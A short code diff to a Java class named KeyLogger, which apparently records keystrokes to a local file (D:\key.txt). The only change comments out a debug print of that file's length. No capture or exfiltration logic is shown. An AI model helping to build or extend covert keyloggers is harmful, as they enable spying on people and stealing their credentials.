@@ -114,7 +114,7 @@ public class KeyLogger implements NativeKeyListener {
 		//myObj = new File("D:\\key.txt");
 		Path fileName = Path.of("D:\\key.txt");
 		content = Files.readString(fileName);
-		System.out.println(content.length());
+		//System.out.println(content.length());
 		
 	  	if(content.length() == 1) {
 	  		//File file= new File("D:\\key.txt");
